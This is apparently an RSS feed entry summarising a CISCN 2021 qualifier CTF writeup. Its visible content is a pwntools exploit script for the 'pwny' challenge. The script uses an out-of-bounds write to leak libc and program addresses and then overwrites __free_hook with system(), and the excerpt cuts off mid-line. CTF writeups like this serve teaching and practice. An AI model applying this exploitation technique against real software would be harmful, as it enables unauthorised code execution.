channel.title: ReflectionMethod on wh1sper
channel.description: Recent content in ReflectionMethod on wh1sper

item.title: CISCN 2021 Quals Writeup by X1cT34m
item.description: Pwn pwny 越界任意写 from pwn import* def menu(ch): p.sendlineafter('choice:',str(ch)) p = process('./main') libc = ELF('./libc-2.27.so') p = remote('124.70.35.238',23807) menu(2) p.sendlineafter('Index:','256') menu(2) p.sendlineafter('Index:','256') menu(1) p.sendlineafter('Index:',p64((-8&0xFFFFFFFFFFFFFFFF))) p.recvuntil('Result: ') libc_base = int(p.recv(12),16) - libc.sym['_IO_2_1_stdout_'] log.info('LIBC:\t' + hex(libc_base)) menu(1) p.sendlineafter('Index:',p64((-11&0xFFFFFFFFFFFFFFFF))) p.recvuntil('Result: ') proc_base = int(p.recv(12),16) - 0x202008 log.info('PROC:\t' + hex(proc_base)) free_hook = libc_base + libc.sym['__free_hook'] L = proc_base + 0x202060 offset = (free_hook - L)/8 menu(2) p.sendlineafter('Index:',str(offset)) p.send(p64(libc_base + libc.sym['system'])) IO_list_all = libc_base + libc.
